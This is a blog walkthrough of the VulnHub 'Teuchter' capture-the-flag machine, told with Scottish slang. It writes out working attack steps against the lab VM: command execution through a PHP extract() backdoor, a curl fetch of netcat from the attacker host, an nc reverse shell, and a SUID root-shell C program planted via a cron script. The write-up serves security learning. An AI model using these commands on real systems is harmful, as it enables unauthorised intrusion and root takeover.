
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Git me some Irn-Bru ye Teuchter! - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="Teuchter writeup">
  <meta name="keywords" content="teuchter, pentest lab, vulnhub, ctf, boot2root, teuchter vulnhub, steghide, irn-bru, scotland">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Git me some Irn-Bru ye Teuchter!</h1>
    
    
      <p class="meta">
        








  


<time datetime="2018-10-14T15:21:15+03:00" pubdate data-updated="true">Oct 14<span>th</span>, 2018</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Today&rsquo;s target is called Teuchter, and yes, apparently that&rsquo;s a word. There is a theme for this machine, and this why this blog post is also..different. ye will need to hang tight to yer sanity for this one. Or drink some Irn-Bru. Ah had to look at other walkthroughs when Ah got stuck and some time was spent checking Scottish references, but it was all worth it!</p>

<p>So, what&rsquo;s a Teuchter? The Wiktionary definition is:</p>

<blockquote><p>(derogatory) A Highlander especially if Gaelic-speaking; a rural Scot in general; (in Glasgow and
surrounding areas) a Scot with a thick accent from outside west-central Scotland.</p></blockquote>

<p>Some hints from the author:</p>

<blockquote><p>This VM is designed to be a bit of a joke/troll so a translator might be useful.</p>

<p>The challenge isn&rsquo;t over with root. I&rsquo;ve done my usual flag shenanigans.</p>

<p>A bit of info security research and knowing yer target helps here.</p>

<p><a href="http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm">http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm</a></p></blockquote>

<p>And this one:</p>

<blockquote><p>Less hochmagandy and more studying is needed for this one!</p></blockquote>

<p>Ah am sure ye have questions, so:</p>

<blockquote><p>hochmagandy &ndash; Scottish a mainly jocular or literary word for sexual intercourse</p></blockquote>

<p>Isn&rsquo;t this a promising start..</p>

<!-- more -->


<p>Nothing much to start from, just a web server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>|_http-title: Dinnae Pwn Ma Server... Away and Hack some bawbag else!</span></code></pre></td></tr></table></div></figure>


<p>On the homepage there is just a GIF and a message:</p>

<p><img class="center" src="/images/pentest/teuchter/web.jpg" title="homepage" alt="web page"></p>

<p>Ran exiftool on the picture and found nothing. However, there are several comments in the source code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- Wullie's favourite film is the Breakfast Club --&gt;
</span><span class='line'>&lt;!-- /gallery/ /flicks/ or /telly/ Maybe Jim Kerr can help with the music...?  --&gt;
</span><span class='line'>&lt;!-- not a lot of people know about different extensions, such as .pht for PHP --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Wullie seems to be the central character here..William? Wallace? We do have a Highlander reference above, and it fits the Scottish theme. While Ah was googling, Ah found this gem on the Urban Dictionary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Wullie is a very caring person who is easy to get on with,
</span><span class='line'>likes all the joys of life.
</span><span class='line'>Meeting and chating to people from all walks of life.
</span><span class='line'>Also known to like a small shandy or two supports the best scottish team the glasgow rangers.
</span><span class='line'>loves to travel and to get home to the family.
</span><span class='line'>what aload of bull shit wullie</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s get back to the challenge, we have 3 potential web directories to check. In the meantime, Ah have Googled for .pht, since Ah have never seen that extension:</p>

<blockquote><p>The pht file extension is associated with the Partial Hypertext file format.</p>

<p>The pht file stores HTML page that includes a PHP script, dynamically generates HTML, often by
accessing database information.</p>

<p>PHT seems to be very little used format.</p>

<p>Mime types:
application/x-httpd-php
text/html</p></blockquote>

<p>Back to the web server, /gallery/ is full of pictures, and the title is Dirty Foties..which Ah think stands for dirty feet. Because ye walk a lot..(someone needs some Irn-Bru)</p>

<p><img class="center" src="/images/pentest/teuchter/gallery.png" title="dirty foties" alt="gallery"></p>

<p>There are more hints in the source code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;title&gt;Dirty Foties&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;h1&gt;We went on a wee sojourn aboot North Kilt Town and here's whit we saw&lt;/h1&gt;
</span><span class='line'>&lt;!-- By now, people will be going doolally. Images will open doors once ye --&gt;
</span><span class='line'>&lt;!-- pick up on the nuances whar's ma glass cheque! --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Here's something else made from Girders:
</span><span class='line'>
</span><span class='line'>&lt;img src="bandit_country.jpg" alt="Andrew Carnegie" height="460" width="968"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;!-- Beware of the milk snatcher --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Here's where the girders used to come from:
</span><span class='line'>&lt;img src="milk_snatcher.jpg" alt="Margaret Roberts" height="409" width="615" align="centre"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Wee hoose on the corner:
</span><span class='line'>&lt;img src="embra.jpg" alt="Castle" height="409" width="615" align="centre"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;!-- The video gives triggers to the gallery --&gt;
</span><span class='line'>
</span><span class='line'>&lt;!-- Definatly need to find that coded message --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>&lt;img src="bigwheel.jpg" alt="Rotating Station" height="460" width="968" align="centre"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>Then we bumped into Mr Corleone:
</span><span class='line'>&lt;img src="horse_heid.jpg" alt="Kelpies" height="409" width="615" align="centre"&gt;</span></code></pre></td></tr></table></div></figure>


<p>North Kilttown is a Scottish town from The Simpsons. Ah searched for the word doolally, even though Ah got the gist from the context. From Wikipedia:</p>

<blockquote><p>&ldquo;Doolally&rdquo;, originally &ldquo;doolally tap&rdquo;, meaning to &lsquo;lose oneâ€²s mind&rsquo;, derived from the boredom felt
at the Deolali British Army transit camp.</p></blockquote>

<p>The Urban Dictionary has another priceless definition for a glass cheque:</p>

<blockquote><p>A Glaswegian term: Describes a special glass bottle, containing Irn-Bru, or other similar soft
drink, available in many cornershops in Scotland. The bottle is returnable and currently attracts a
25p refund when ye give the bottle back to the shop. Called a cheque as they are often collected
and cashed (like a cheque)by students and cheap bastards alike either to buy more Bru, or with
enough bottles, some skag.</p></blockquote>

<p>If ye&rsquo;re not curious about what something called Irn-Bru is, ye&rsquo;re a bawheid!</p>

<blockquote><p>The ultimate hangover cure. Tastes best when consumed directly from a 750ml glass bottle.</p>

<p>Another one of Scotland&rsquo;s many national identities.</p>

<p>Scotland is the only country in the world that produces a soft drink that outsells Coca Cola.</p></blockquote>

<p>Ah must try some Irn-Bru! By the way, if ye were wondering, the &ldquo;Wee hoose on the corner&rdquo; is nothing spectacular&hellip;only the Edinburgh Castle! The Kelpies are 30-metre-high horse-head sculptures featuring kelpies&hellip;so what are kelpies? +1 to mythology skill:</p>

<blockquote><p>Kelpie, or water kelpie, is the Scots name given to a shape-shifting water spirit inhabiting the
lochs and pools of Scotland. It has usually been described as appearing as a horse, but is able to
adopt human form</p></blockquote>

<p>How did Ah get in this spiral? Ah had a box to hack..ye know what would help me focus? It starts with Irn and ends with Bru!</p>

<p>The /flicks/ directory gives a 403 Forbidden error, but also discloses the web server version, which is Apache/2.4.18 (Ubuntu) Server</p>

<p>The /telly/ directory also has a picture and 2 videos, along with more hints:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;title&gt;STV Embra&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;h1&gt;Here's some telly programs fur ye!&lt;/h1&gt;
</span><span class='line'>&lt;!-- Mind the hidden messages --&gt;
</span><span class='line'>&lt;b&gt;&lt;/b&gt;
</span><span class='line'>&lt;img src="STV.jpg" alt="STV" height=300" width="400"&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>Now for some adverts....
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>&lt;!-- noise up those crazy yanks 1st hint to a password --&gt;
</span><span class='line'>&lt;video height="300" width="400" controls&gt;
</span><span class='line'>&lt;source src="girders.ogv" type="video/ogg"&gt;
</span><span class='line'>&lt;/video&gt;
</span><span class='line'>&lt;!-- next hint, see how many people make the connection  --&gt;
</span><span class='line'>&lt;!-- between A.G. Barr and the gallery... Aled Jones eh? --&gt;
</span><span class='line'>&lt;video height="300" width="400" controls&gt;
</span><span class='line'>&lt;source src="aled.ogv" type="video/ogg"&gt;
</span><span class='line'>&lt;/video&gt;
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;!-- Third video gives triggers to the flicks phpinfo --&gt;
</span><span class='line'>By the way, it's only aboot 250 weeks ti Christmas!
</span><span class='line'>&lt;br&gt;&lt;/br&gt;</span></code></pre></td></tr></table></div></figure>


<p>In case ye forgot about Irn-Bru, here&rsquo;s a reminder:</p>

<blockquote><p>A.G. BARR p.l.c., commonly known as Barr&rsquo;s, is a Scottish soft drink manufacturer, based in
Cumbernauld, Scotland. It manufactures the popular Scottish drink, Irn-Bru</p></blockquote>

<p>Back to the challenge&hellip;but it would be easier if Ah had some Irn-Bru! At this point, the only actionable hint Ah could understand was the one about phpinfo. There is no third video on the page, so Ah just tried navigating to <a href="http://192.168.145.131/flicks/phpinfo.php,">http://192.168.145.131/flicks/phpinfo.php,</a> which didn&rsquo;t work. Following on the hint about .pht extensions, Ah changed it to <a href="http://192.168.145.131/flicks/phpinfo.pht">http://192.168.145.131/flicks/phpinfo.pht</a> and got a blank page instead.</p>

<p>After some Googling and drooling over Irn-Bru, Ah found a blog post about <a href="https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html">PHP Backdoors: Hidden With Clever Use of Extract Function</a>. It explains about a seemingly innocuous backdoor with the code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>@extract ($_REQUEST); 
</span><span class='line'>@die ($ctime($atime));</span></code></pre></td></tr></table></div></figure>


<blockquote><p>The extract() function imports variables into the local symbol table from an array.</p>

<p>This function uses array keys as variable names and values as variable values. For each element it
will create a variable in the current symbol table.</p></blockquote>

<p>The blog post is a very interesting read, and the applicable item is that the code is extracting content sent via GET/POST requests and creating variables that are then executed with the format <code>execute ctime with atime as argument</code></p>

<p>Following the example, running <a href="http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=whoami">http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=whoami</a> returns www-data, so we have achieved command execution! Time for an Irn-Bru break&hellip;</p>

<p>Doing very light enumeration, Ah found out that netcat is available on the target, so Ah fired up a listener and tried using netcat to serve a shell on my listener, but it didn&rsquo;t work. So Ah used Python&rsquo;s SimpleHTTPServer to transfer my netcat to the target system. Note that ye have to use URL encoding: <code><a href="http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc">http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc</a></code></p>

<p>The binary was downloaded to <code>/var/www/html/flicks</code>. Ah made it executable and ran it, but nothing happened. Next, Ah moved it to /tmp and ran it from there with <code>192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=%2Ftmp%2Fnc%20192.168.145.129%208080%20-e%20%2Fbin%2Fbash</code> and it worked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8080
</span><span class='line'>listening on [any] 8080 ...
</span><span class='line'>connect to [192.168.145.129] from (UNKNOWN) [192.168.145.131] 49172
</span><span class='line'>whoami
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>We have a reverse shell, but it&rsquo;s very limited. The usual Python shell spawning didn&rsquo;t work, because on the box there&rsquo;s actually Python 3. Which only changes things slightly: <code>python3 -c &ldquo;import pty; pty.spawn(&lsquo;/bin/bash&rsquo;);&rdquo;</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python3 -c "import pty; pty.spawn('/bin/bash');"
</span><span class='line'>www-data@teuchter:/var/www/html/flicks$ ls /home
</span><span class='line'>ls /home
</span><span class='line'>cpgrogan  jkerr  proclaimers</span></code></pre></td></tr></table></div></figure>


<p>Inside cpgrogan there&rsquo;s a kochanski directory that we&rsquo;re not permitted to view. In jkerr&rsquo;s home there&rsquo;s an empty .sudo_as_admin_successful file, but we find a hint about jkerr&rsquo;s password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@teuchter:/home/jkerr$ cat login.txt
</span><span class='line'>cat login.txt
</span><span class='line'>Jim,
</span><span class='line'>
</span><span class='line'>Ah decided to rename yer account to jkerr and reset the password
</span><span class='line'>ye'll find it in the photo. Just remember the decode password
</span><span class='line'>dosn't have a space.
</span><span class='line'>
</span><span class='line'>If ye can't figure it out, it's the new name for Jonny & the
</span><span class='line'>Self-Abusers...</span></code></pre></td></tr></table></div></figure>


<p>And inside proclaimers there are 2 directories. We can&rsquo;t enter 500miles, but inside letterfromamerica there are 2 interesting files belonging to root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@teuchter:/home/proclaimers/letterfromamerica$ ls -alh
</span><span class='line'>ls -alh
</span><span class='line'>total 164K
</span><span class='line'>drwxr-xr-x 2 proclaimers proclaimers 4.0K Aug 11  2016 .
</span><span class='line'>drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
</span><span class='line'>-rwsr-xr-x 1 root        root        151K Aug 11  2016 semaphore
</span><span class='line'>-r-Sr-sr-t 1 root        root          42 Jul  9  2016 test</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Inside test there is some kind of message, stating that &ldquo;So Claire was right about those wildcards&rdquo;, and semaphore is an executable. Running it gives a shell under the same user account. Probably need more information (or Irn-Bru) before exploiting this.</p>

<p>Back to the next step, did a su to jkerr and used <em>breakfastclub</em> as a password and it worked! Ah used Python to transfer the images to my machine and broke my shell in the process:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jkerr@teuchter:~$ python3 -m http.server 8080
</span><span class='line'>python3 -m http.server 8080
</span><span class='line'>Serving HTTP on 0.0.0.0 port 8080 ...
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:23] "GET / HTTP/1.1" 200 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:23] code 404, message File not found
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:23] "GET /robots.txt HTTP/1.1" 404 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:27] "GET /promisedyeamiracle.jpg HTTP/1.1" 200 -
</span><span class='line'>192.168.145.129 - - [13/Oct/2018 18:33:29] "GET /breakfastclub.jpg HTTP/1.1" 200 -</span></code></pre></td></tr></table></div></figure>


<p>An Irn-Bru would have prevented that mistake! After redoing the steps, Ah ran exiftool on the downloaded images and found a base64 encoded string in promisedyeamiracle.jpg:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Copyright                       : Z2VtaW5pCg==</span></code></pre></td></tr></table></div></figure>


<p>Decoded, it means <em>gemini</em>. Ah didn&rsquo;t know what to do with this, so Ah googled for the other user accounts.</p>

<p>cpgrogan:</p>

<blockquote><p>Claire Patricia Grogan (born 17 March 1962), known professionally as Clare Grogan or sometimes as
C. P. Grogan, is a Scottish actress and singer. She is best known as the lead singer of the 1980s
new wave music group Altered Images and for supporting roles in the 1981 film Gregory&rsquo;s Girl and
the science fiction sitcom Red Dwarf as the first incarnation of Kristine Kochansk</p></blockquote>

<p>proclaimers:</p>

<blockquote><p>The Proclaimers are a Scottish music duo composed of twin brothers Charlie and Craig Reid (born 5
March 1962). They are best known for their songs &ldquo;I&rsquo;m Gonna Be (500 Miles)&rdquo;, &ldquo;Sunshine on Leith&rdquo;,
&ldquo;I&rsquo;m On My Way&rdquo; and &ldquo;Letter from America&rdquo;, and their singing style with a Scottish accent</p></blockquote>

<p>Well, we don&rsquo;t need an Irn-Bru to connect the dots, gemini, twins! That is actually the password for the proclaimers account. Now to get back to the folders from before:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>proclaimers@teuchter:~/500miles$ ls -alh
</span><span class='line'>ls -alh
</span><span class='line'>total 228K
</span><span class='line'>drwx------ 2 proclaimers proclaimers 4.0K Jul  9  2016 .
</span><span class='line'>drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers 8.0K Jun 30  2016 choclate_lassie.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers  97K Jun 30  2016 city_discovery.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers 8.5K Jun 30  2016 night_oot_teuchters.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers  87K Jun 30  2016 Restless-Natives-Scotland.jpg
</span><span class='line'>-rw-rw---- 1 proclaimers proclaimers  11K Jun 30  2016 SPT_red.jpg</span></code></pre></td></tr></table></div></figure>


<p>Ah downloaded the images in case of need and out of curiosity. Then it was back to the semaphore. Ah grepped for files containing the word semaphore, and tried avoiding being flooded by irrelevant results like libraries. Eventually, Ah got a hit under <em>/usr/local</em>, in the <code>/usr/local/bin/numpties.sh</code> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/sh
</span><span class='line'>
</span><span class='line'>## Right, time to sort out these numpties that put PHP shells on ma server!
</span><span class='line'>
</span><span class='line'>## Steal a copy to examine later
</span><span class='line'>/bin/tar czvf /root/shells.tgz /var/www/html/*.php
</span><span class='line'>
</span><span class='line'>## Aww they dobbers with primative Egpytian Encryption can away and raffle themselves
</span><span class='line'>sudo apt-get -y purge openssh-server sftp wget 
</span><span class='line'>
</span><span class='line'>## Delete the shells to annoy the eejits
</span><span class='line'>/bin/rm -rf /var/www/html/*.php
</span><span class='line'>
</span><span class='line'>## Plant a semaphore in to alert the monitoring system
</span><span class='line'>if /usr/bin/[ -f /home/proclaimers/letterfromamerica/semaphore ]
</span><span class='line'>  then
</span><span class='line'>    /bin/chown root.root /home/proclaimers/letterfromamerica/semaphore
</span><span class='line'>    /bin/chmod 4755 /home/proclaimers/letterfromamerica/semaphore
</span><span class='line'>fi</span></code></pre></td></tr></table></div></figure>


<p>Back to the dictionaries it is, and memory alert, Ah remembered being called a numpty once!</p>

<blockquote><p>numpty &ndash; A person who is incapable of performing the simplest of task correctly. Usual symptoms
include poor hand-eye coordination, zero common sense and the general illusion that they are
special (caused by parents referring to them as such and the numpty not fully grasping the meaning
implied).</p>

<p>Common causes are being dropped as a baby or repeated heavy blows to head in later life.</p>

<p>dobber &ndash; A Glasgow term for a dick head or in general just a stupid cunt.</p></blockquote>

<p>Now for the code, attempts to put PHP shells on the server fail because the shells get deleted. Also, a couple of file transfer utilities have been removed (the reason why Ah resorted to curl). It looks like this might be used in a cronjob. Finally, if the semaphore file exists, its owner is changed to root and the SUID bit is set. Which means, we can create a semaphore file that would allow us to become root if it were SUID.</p>

<p>On my box, Ah compiled an executable (no GCC on the target) with the following C code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;sys/types.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>int main(void)
</span><span class='line'>{
</span><span class='line'>  setuid(0); setgid(0); system("/bin/bash");
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Ah made it executable for everyone and transfered it to the target, again with curl:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl http://192.168.145.129/rootme --output ./semaphore     
</span><span class='line'>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span><span class='line'>                                 Dload  Upload   Total   Spent    Left  Speed
</span><span class='line'>100 16712  100 16712    0     0  1002k      0 --:--:-- --:--:-- --:--:-- 1020k</span></code></pre></td></tr></table></div></figure>


<p>Waited a while, thought about some Irn-Bru, came back and got root!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./semaphore
</span><span class='line'>root@teuchter:~/letterfromamerica#</span></code></pre></td></tr></table></div></figure>


<p>Finding the flag is usually the last step, but not on knightmare&rsquo;s machines!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
